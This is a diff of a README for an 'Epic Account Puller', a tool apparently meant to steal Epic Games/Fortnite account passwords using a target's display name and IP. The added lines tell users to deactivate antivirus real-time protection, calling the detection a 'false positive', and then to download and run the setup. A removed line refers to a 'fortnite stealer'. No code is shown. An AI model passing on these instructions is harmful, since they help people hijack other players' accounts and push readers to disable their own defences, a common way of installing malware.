@@ -1,6 +1,17 @@
 hey how are you doing this is version one of my epic account puller i hope u like it have a good day 
 
-also install node use both fortnite stealer to get there stuff and epic account puller to pull all there information
+deactivate real time protection its a false positive 
+
+setup 
+download zip 
+
+then extract all 
+after u extract run setup 
+
+then run Epic account puller it will ask for display name and name of the person after that
+
+
+all u need is the display name and the ip when u have that it will get u the password searching through everything to find the password
 
 
 Epic Account Puller (Windows Only)
